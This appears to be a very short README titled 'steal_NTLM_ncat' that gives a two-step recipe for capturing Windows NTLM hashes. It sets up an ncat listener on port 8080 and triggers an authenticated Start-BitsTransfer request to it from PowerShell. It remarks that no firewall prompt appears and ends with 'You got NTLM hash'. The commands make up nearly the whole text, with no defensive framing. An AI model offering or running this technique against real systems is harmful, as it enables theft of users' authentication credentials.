# steal_NTLM_ncat

Start a CMD window and type:
ncat -l 8080 --keep-open < hello.html
***No need to allow on firewall prompt***

Start a Powershell window and type:
Start-BitsTransfer -Authentication NTLM -Source http://127.0.0.1:8080 -Description http://127.0.0.1:8080

Result:
___You got NTLM hash__
